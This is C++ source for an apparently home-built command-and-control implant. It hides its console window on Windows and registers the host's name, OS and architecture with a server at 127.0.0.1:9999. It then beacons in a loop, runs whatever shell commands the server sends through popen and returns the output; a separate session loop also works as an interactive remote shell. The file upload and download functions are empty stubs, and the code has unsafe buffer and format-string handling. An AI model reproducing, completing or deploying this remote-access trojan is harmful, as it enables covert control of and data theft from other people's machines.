#include <fcntl.h>
#include <cstdlib>
#include <unistd.h>
#include <stdbool.h>
#include <cstdio>
#include <cstring>

#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
    #include "cJSON/cJSON.h"
    #include <unistd.h>
    //#include <Iphlpapi.h>
    //#include <Assert.h>
    //#pragma comment(lib, "iphlpapi.lib")
    //#pragma comment(lib, "ws2_32.lib")
    //#pragma comment(lib, "Secur32.lib")
    #define file_path "Z:\\tmp\\id"
#else
    #include <cjson/cJSON.h>
    #include <sys/utsname.h>
    #include <sys/ioctl.h>
    #include <net/if.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #define file_path "/tmp/id"
    
#endif
#define PORT 9999
#define ADDR "127.0.0.1"
#define BUFFER_SIZE 4096
#define MAX_RESPONSE 0x20000

class Device {
    public:
    void hideConsole();
    const char* get_MAC();
    const char* get_Arch();
};

class Communicate_ {
    private:
    int sock;
    public:
    int conn();
    void reg(Device d);
    void beacon(const char *id);
    void session();
    void upload();
    void download();
};

int main() {
    Communicate_ comm;
    Device d;
    #ifdef _WIN32
    d.hideConsole();
    #endif
    while (1) {
        if (comm.conn() == -1) {
            sleep(300); // use random for 
            continue;
        }
        int file = open(file_path, O_RDONLY);
        if (file == -1) {
            comm.reg(d);
            sleep(300);
            continue;
        }
        char id[BUFFER_SIZE];
        read(file, id, sizeof(id));
        // check if agent_id file exists
        comm.beacon(id);
        sleep(5);
    }
    return 0;
}



int Communicate_::conn() {
    #ifdef _WIN32
        WSADATA wsaData;
        struct sockaddr_in serverAddress;
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(PORT);
        serverAddress.sin_addr.s_addr = inet_addr(ADDR);

        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return -1;
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == (int)INVALID_SOCKET) {
            WSACleanup();
            return -1;
        }
        start_connect:
        if (connect(sock, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
            Sleep(30);
            goto start_connect;
        }
        return 0;
    #else
        int status;
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);

        sock = socket(AF_INET, SOCK_STREAM, 0);

        if (inet_pton(AF_INET, ADDR, &serv_addr.sin_addr) <= 0) {
            return -1;
        }
        start_connect:
        if ((status = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
            sleep(30);
            goto start_connect;
            return -1;
        }
        return 0;
    #endif
}

#ifdef _WIN32
void Device::hideConsole() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}
#endif

// change
const char* Device::get_MAC() {
    return "hello";
}
/*
const char* Device::get_MAC() {
    PIP_ADAPTER_INFO AdapterInfo;
    DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
    char *mac_addr = (char*)malloc(18);
  
    AdapterInfo = (IP_ADAPTER_INFO *) malloc(sizeof(IP_ADAPTER_INFO));
    if (AdapterInfo == NULL) {
      printf("Error allocating memory needed to call GetAdaptersinfo\n");
      free(mac_addr);
      return NULL; // it is safe to call free(NULL)
    }

    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
      free(AdapterInfo);
      AdapterInfo = (IP_ADAPTER_INFO *) malloc(dwBufLen);
      if (AdapterInfo == NULL) {
        printf("Error allocating memory needed to call GetAdaptersinfo\n");
        free(mac_addr);
        return NULL;
      }
    }
  
    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
      // Contains pointer to current adapter info
      PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
      do {
        // technically should look at pAdapterInfo->AddressLength
        //   and not assume it is 6.
        sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
          pAdapterInfo->Address[0], pAdapterInfo->Address[1],
          pAdapterInfo->Address[2], pAdapterInfo->Address[3],
          pAdapterInfo->Address[4], pAdapterInfo->Address[5]);

        printf("\n");
        pAdapterInfo = pAdapterInfo->Next;        
      } while(pAdapterInfo);                        
    }
    free(AdapterInfo);
    return mac_addr;
}
*/


const char* Device::get_Arch() {
    #ifdef _WIN32
        SYSTEM_INFO sysInfo;
        GetNativeSystemInfo(&sysInfo);
        switch (sysInfo.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64: return "x64"; break;
            case PROCESSOR_ARCHITECTURE_INTEL: return  "x86"; break;
            case PROCESSOR_ARCHITECTURE_ARM64: return  "ARM64"; break;
            default: return "unknown"; break;
        }
    #else
        char *arch = (char*)malloc(0x32);
        struct utsname buffer;
        if (uname(&buffer) == 0) {
            snprintf(arch, 0x32, "%s", buffer.machine);
            return arch; 
        } else {
            return "Error getting architecture.\n";
        }
    #endif
}


void Communicate_::beacon(const char *id) {
    cJSON *bea = cJSON_CreateObject();
    cJSON_AddStringToObject(bea, "mode", "beacon");
    cJSON_AddStringToObject(bea, "agent_id", id);
    char *data = cJSON_Print(bea);
    send(sock, data, strlen(data), 0);
    free(data);
    cJSON_Delete(bea);

    char buffer[BUFFER_SIZE];
    int bytes = recv(sock, buffer, sizeof(buffer), 0);
    if (bytes <= 0) {
        // err/
    }
    cJSON *reply = cJSON_Parse(buffer);
    cJSON *mode = cJSON_GetObjectItem(reply, "mode");
    if (strncmp(mode->valuestring, "none", 4) == 0) {
        return;
    }  

    cJSON *task_id = cJSON_GetObjectItem(reply, "task_id");
    cJSON *cmd = cJSON_GetObjectItem(reply, "command");
    // if command = "upload [file path]" | upload file to agent
    
    if (strncmp(cmd->valuestring, "upload", 6) == 0) upload();
    // if command = "download [file path]" | download file from agent
    if (strncmp(cmd->valuestring, "download", 8) == 0) download();
    
    
    // execute command
    // char *result = exec(cmd->valuestring);
    FILE *exec;
    cJSON *re = cJSON_CreateObject();
    char result[MAX_RESPONSE];
    memset(buffer, 0, sizeof(buffer));
    char command_with_redirect[BUFFER_SIZE + 10];
    snprintf(command_with_redirect, sizeof(command_with_redirect), "%s 2>&1", cmd->valuestring);

    #ifdef _WIN32
    exec = _popen(command_with_redirect, "r");
    #else
    exec = popen(command_with_redirect, "r");
    #endif
    if (!exec) {
        strcpy(result, "Failed to execute command.\n");

        goto SEND_RESULT;
    }

    while (fgets(buffer, sizeof(buffer), exec) != NULL) {
        strcat(result, buffer);
    }
    // send result
    SEND_RESULT:
    cJSON_AddStringToObject(re, "mode", "result");
    cJSON_AddStringToObject(re, "agent_id", id);
    cJSON_AddNumberToObject(re, "task_id", task_id->valueint);
    cJSON_AddStringToObject(re, "response", result);
    char *result_ = cJSON_Print(re);
    send(sock, result_, strlen(result_), 0);
    fclose(exec);
    cJSON_Delete(re);
    free(result_);
}

void Communicate_::reg(Device d) {
    char hostname[BUFFER_SIZE];
    char os[BUFFER_SIZE];

    if (gethostname(hostname, sizeof(hostname)) != 0) snprintf(hostname, sizeof(hostname), "Unknown");
    const char *arch = d.get_Arch();
    const char *mac = d.get_MAC();    
    #ifdef _WIN32
    snprintf(os,sizeof(os), "%s", "windows");
    #else
    snprintf(os,sizeof(os), "%s", "linux");
    #endif
    cJSON *reg = cJSON_CreateObject();
    cJSON_AddStringToObject(reg, "mode", "register");
    cJSON_AddStringToObject(reg, "os", os);
    cJSON_AddStringToObject(reg, "mac", mac);
    cJSON_AddStringToObject(reg, "hostname", hostname);
    cJSON_AddStringToObject(reg, "arch", arch);
    //#ifdef _WIN32
    //#else
    //free(arch);
    //#endif
    // send to server
    char *data = cJSON_Print(reg);
    send(sock, data, strlen(data), 0);
    free(data);
    cJSON_Delete(reg);

    char buffer[BUFFER_SIZE];
    int bytes = recv(sock, buffer, sizeof(buffer), 0);
    if (bytes <= 0) {
        // 
    }
    cJSON *reply = cJSON_Parse(buffer);
    cJSON *id = cJSON_GetObjectItem(reply, "agent_id");

    // store id in a file
    // file path
    STORE_ID:
    FILE *f = fopen(file_path, "w");
    if (!f) {
        sleep(3000);
        goto STORE_ID;
    }

    fprintf(f, id->valuestring);
    //fwrite(id->valuestring, 1, sizeof(id->valuestring), f);
    fclose(f);
    cJSON_Delete(reply);
}

void Communicate_::session() {
    char command[BUFFER_SIZE];
    char response[MAX_RESPONSE];
    char container[BUFFER_SIZE];
    char error[BUFFER_SIZE] = "Failed to execute command";
    while (1) {
        memset(command, 0, BUFFER_SIZE);
        memset(container, 0, BUFFER_SIZE);
        memset(response, 0, sizeof(response));

        // recv

        int bytes_received = recv(sock, command, sizeof(command), 0);
        if (bytes_received <= 0) {
            continue;
        }
        command[bytes_received] = '\0';
        if((strncmp("q", command, 1) == 0) || (strncmp("quit", command, 4) == 0) || (strncmp("exit", command, 4) == 0)) {
            break; 
        } else {
            FILE *exec;
            char cmd_w_redirect[BUFFER_SIZE + 10];
            snprintf(cmd_w_redirect, sizeof(cmd_w_redirect), "%s 2>&1", command);
            #ifdef _WIN32
            exec = _popen(cmd_w_redirect, "r");
            #else
            exec = popen(cmd_w_redirect, "r");
            #endif
            if (!exec) {
                send(sock, error, strlen(error), 0);
                continue;
            }
            while (fgets(container, sizeof(container), exec) != NULL) {
                strcat(response, container);
            }

            send(sock, response, strlen(response), 0);
            fclose(exec);
        }


    }

}

void Communicate_::upload() {

}

void Communicate_::download() {

}
